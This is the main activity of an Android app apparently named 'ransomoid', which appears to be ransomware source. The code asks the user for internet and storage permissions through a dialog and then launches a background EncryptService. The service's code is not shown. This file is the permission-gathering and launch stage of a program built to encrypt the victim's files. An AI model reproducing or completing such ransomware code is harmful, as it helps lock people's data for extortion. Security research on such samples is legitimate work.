package falezza.fabio.ransomoid;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;

import falezza.fabio.ransomoid.services.EncryptService;

public class MainActivity extends AppCompatActivity {

    String[] neededPermission = {
            Manifest.permission.INTERNET,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /*
         * To run permission is needed. If android version is greater than marshmallow it need to
         * ask for permission at runtime.
         */
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            this.showPermissionAlertDialog();
        } else {
            this.startEncryptService();
        }
    }

    private void showPermissionAlertDialog() {
        AlertDialog.Builder dialog = new AlertDialog.Builder(this)
                .setTitle(R.string.main_activity_alert_dialog_title)
                .setMessage(R.string.main_activity_alert_dialog_message)
                .setPositiveButton("ok", new AllowPermissionOnClickListener());
        dialog.show();
    }

    private boolean checkPermissions() {
        int result;
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : this.neededPermission) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 100);
            return checkPermissions();
        }
        return true;
    }

    private void startEncryptService() {
        new RunEncryptService().execute(this.getApplicationContext());
    }

    private class AllowPermissionOnClickListener implements DialogInterface.OnClickListener {

        @Override
        public void onClick(DialogInterface dialogInterface, int i) {
            if (checkPermissions()) {
                startEncryptService();
            }
        }
    }

    @SuppressLint("StaticFieldLeak")
    private class RunEncryptService extends AsyncTask<Context, Void, Void> {
        protected Void doInBackground(Context... params) {
            Intent srv = new Intent(params[0], EncryptService.class);
            startService(srv);
            return null;
        }
    }
}
